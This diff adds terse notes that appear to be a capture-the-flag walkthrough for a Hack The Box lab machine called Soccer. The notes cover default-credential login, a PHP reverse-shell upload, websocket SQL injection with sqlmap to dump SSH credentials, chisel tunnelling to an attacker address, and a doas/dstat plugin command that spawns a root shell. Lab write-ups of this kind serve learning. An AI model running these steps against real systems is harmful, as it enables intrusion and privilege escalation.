@@ -1,0 +1,57 @@
+subdomain enumeration came up with no information;
+
+Webenum using SecLists/Discovery/Web-Content/big.txt came out with a hit on,
+http://soccer.htb/tiny/tinyfilemanager.php -> login for the tiny file manager
+
+default login - admin:admin@123
+
+there is an uploads page where you can simply upload your php rShell and gain access as a low-level user inside the system
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+cannot use sudo -l
+
+no clue what the password is for the user
+
+adding linpeas.sh to the tmp folder directory we can chmod +x and execute;
+linpeas tells us this machine is Vulnerable to CVE-2021-3560
+
+viewing /etc/nginx/sites-avaiable/ -> this shows domains we can goto
+	http://soc-player.soccer.htb/ -> carries a login page via email
+
+Looking at the /ticket source code there was a variable called ID that was being sent to a web socket server on port 9091; this id could be injected so looking up, websocket sqli gave us a python script to combo with a sqlmap
+
+using sqlmap and its --dump flag we can after a long time output ssh creds
+
+player@player.htb:PlayerOftheMatch2022
+player@10.10.11.194:PlayerOftheMatch2022 -> SSH
+
+[player@soccer.htb]
+
+user -> 6f754420f287488d0521b761fa569d5d
+
+After SSH'ing into the machine, Player cannot run SUDO on the box
+
+netstat -tl : shows tcp listening ports
+
+./chisel client 10.10.14.110:8000 R:3000:127.0.0.1:3000 R:33060:127.0.0.1:33060
+
+find / d -name [name] 2>/dev/null -> outputs all paths that have the name in it
+
+Using the autoEnum.sh I made, looking for possible GTFO-Bins it showed doas
+
+After Running:
+player@soccer:~$ find / d -name doas.conf 2>/dev/null
+/usr/local/etc/doas.conf
+player@soccer:~$ cat /usr/local/etc/doas.conf
+permit nopass player as root cmd /usr/bin/dstat
+
+What we can now do, is using doas:
+	doas -u root /usr/bin/dstat
+We can user the root username to run dstat
+
+dstat is a GTFO-Bin:
+	echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
+	doas -u root /usr/bin/dstat -xxx
+	
+We Are Root!
